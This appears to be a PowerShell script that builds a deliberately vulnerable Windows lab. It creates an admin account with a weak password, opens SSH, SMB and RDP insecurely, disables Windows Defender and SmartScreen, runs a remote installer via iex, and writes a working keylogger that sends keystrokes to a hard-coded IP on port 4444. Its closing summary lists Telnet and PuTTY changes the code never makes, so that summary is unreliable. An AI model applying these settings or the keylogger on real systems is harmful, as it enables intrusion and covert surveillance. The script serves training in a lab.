# Security Warning: Run this only in an isolated lab environment
# Requires Admin privileges
Set-ExecutionPolicy Bypass -Scope Process -Force

# Lab Configuration
$labBase = "C:\CyberLab"
$pythonVersion = "3.12.1"
$testIP = "192.168.1.100"

function Initialize-Lab {
    param(
        [string]$LabPath,
        [string]$PythonVersion
    )

    # Create lab structure
    $dirs = @(
        "$LabPath\Malware_Samples",
        "$LabPath\Network_Traffic",
        "$LabPath\Victim_Files",
        "$LabPath\Tools",
        "$LabPath\Test_Directories\ransomware_test",
        "$LabPath\Test_Directories\keylogger_test",
        "$LabPath\Test_Directories\worm_test"
    )

    $dirs | ForEach-Object {
        New-Item -Path $_ -ItemType Directory -Force | Out-Null
    }

    # Create test files
    1..5 | ForEach-Object {
        New-Item -Path "$LabPath\Test_Directories\ransomware_test\file$_.test" -ItemType File
        New-Item -Path "$LabPath\Test_Directories\keylogger_test\test$_.txt" -ItemType File
    }

    # Install required system features
    Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V-All -All -NoRestart
    Enable-WindowsOptionalFeature -Online -FeatureName Containers -All -NoRestart

    # Correct OpenSSH Server installation
    try {
        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop
        Start-Service sshd
        Set-Service -Name sshd -StartupType Automatic
    }
    catch {
        Write-Warning "OpenSSH Server installation failed: $_"
    }

    # Create vulnerable test user
    $password = ConvertTo-SecureString "Password123" -AsPlainText -Force
    New-LocalUser -Name "labuser" -Password $password -Description "Vulnerable Lab Account"
    Add-LocalGroupMember -Group "Administrators" -Member "labuser"
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member "labuser"
}

function Configure-SSH-Vulnerabilities {
    # Install and configure vulnerable SSH
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

    # Create vulnerable SSH config
    $sshdConfig = @"
Port 22
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
ChallengeResponseAuthentication no
UsePAM yes
AllowTcpForwarding yes
X11Forwarding yes
"@
    Set-Content -Path "$env:ProgramData\ssh\sshd_config" -Value $sshdConfig

    # Restart SSH service
    Restart-Service sshd
}

function Configure-SMB-Vulnerabilities {
    # Enable insecure SMB protocols
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "SMB1" -Type DWORD -Value 1 -Force

    # Create vulnerable share
    New-SmbShare -Name "VULNERABLE_SHARE" -Path "C:\Vulnerable" -FullAccess "Everyone"

    # Set insecure permissions
    icacls "C:\Vulnerable" /grant "Everyone:(OI)(CI)F"

    # Disable SMB security
    Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force
    Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
    Set-SmbServerConfiguration -EnableInsecureGuestLogons $true -Force
}

function Configure-RDP-Vulnerabilities {
    # Enable RDP with weak security
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0

    # Lower encryption level
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MinEncryptionLevel" -Value 1

    # Allow saved credentials
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "DisableDomainCreds" -Value 0
}

function Install-LabDependencies {
    # Install Chocolatey
    Set-ExecutionPolicy Bypass -Scope Process -Force
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

    # Install Python
    choco install python --version $pythonVersion -y
    refreshenv

    # Install Python packages
    python -m pip install --upgrade pip
    python -m pip install keyboard paramiko cryptography pyautogui psutil

    # Install networking tools
    choco install wireshark nmap -y

    # Download PsExec for worm tests
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile("https://live.sysinternals.com/tools/PsExec.exe", "$labBase\Tools\PsExec.exe")
}

function Configure-Firewall {
    # Allow lab network traffic
    $ports = @(22, 445, 3389, 4444, 1337, 443)
    New-NetFirewallRule -DisplayName "Lab_TCP" -Direction Inbound -LocalPort $ports -Protocol TCP -Action Allow
    New-NetFirewallRule -DisplayName "Lab_UDP" -Direction Inbound -LocalPort $ports -Protocol UDP -Action Allow

    # Disable Windows Defender protections
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -EnableAppControl 0 -EnableNetworkProtection 0 -DisableRestorePoint $true
    Set-MpPreference -DisableScriptScanning $true -DisableArchiveScanning $true

    # Add exclusions for lab tools
    Add-MpPreference -ExclusionPath "$labBase\*"
    Add-MpPreference -ExclusionProcess "python.exe", "PsExec.exe"

    # Disable SmartScreen
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0

    Write-Host "[!] Windows Defender App & Browser Control disabled"

    # Add vulnerable service ports
    New-NetFirewallRule -DisplayName "Vulnerable_Services" -Direction Inbound -LocalPort @(21,23,135,139,445,3389) -Protocol TCP -Action Allow

    # Disable Windows Defender completely
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableArchiveScanning $true
    Set-MpPreference -DisableBehaviorMonitoring $true
    Set-MpPreference -DisableBlockAtFirstSeen $true
}

function Create-ExampleFiles {
    # Create sample keylogger.py
    @"
import keyboard
import socket

HOST = '$testIP'
PORT = 4444

def key_handler(event):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(event.name.encode())

keyboard.on_press(key_handler)
keyboard.wait()
"@ | Out-File "$labBase\Malware_Samples\demo_keylogger.py"

    # Create safety wrapper scripts
    Create-SafetyScripts
}

function Create-SafetyScripts {
    # Create lab reset script
    @"
# Lab Cleanup Script
Remove-Item -Path "$labBase" -Recurse -Force
Set-MpPreference -DisableRealtimeMonitoring `$false
Set-MpPreference -EnableAppControl 1 -EnableNetworkProtection 1
Remove-MpPreference -ExclusionPath "$labBase\*"
Get-NetFirewallRule -DisplayName "Lab_*" | Remove-NetFirewallRule
"@ | Out-File "$labBase\Tools\LabReset.ps1"

    # Create network monitor
    @"
# Network Monitor
& "C:\Program Files\Wireshark\tshark.exe" -i Ethernet0 -f "tcp port 4444 or 443" -w "$labBase\Network_Traffic\lab_capture.pcapng"
"@ | Out-File "$labBase\Tools\StartMonitoring.ps1"
}

# Main execution
try {
    Write-Host "=== Cyber Lab Setup ==="
    Initialize-Lab -LabPath $labBase -PythonVersion $pythonVersion
    Install-LabDependencies
    Configure-Firewall
    Create-ExampleFiles

    Configure-SSH-Vulnerabilities
    Configure-SMB-Vulnerabilities
    Configure-RDP-Vulnerabilities

    Write-Host @"
=== Created Intentional Vulnerabilities ===
1. SSH:
   - Root login enabled
   - Password authentication enabled
   - Default credentials: labuser/Password123

2. SMB:
   - SMBv1 enabled
   - Open share at \\localhost\VULNERABLE_SHARE
   - Guest access allowed

3. RDP:
   - Network Level Authentication disabled
   - Weak encryption enabled
   - Saved credentials allowed

4. Additional Vulnerabilities:
   - Telnet server enabled
   - PUTTY installed with saved sessions
   - Firewall ports 21/23/135/139 open
"@
}
catch {
    Write-Host "Error during setup: $_"
}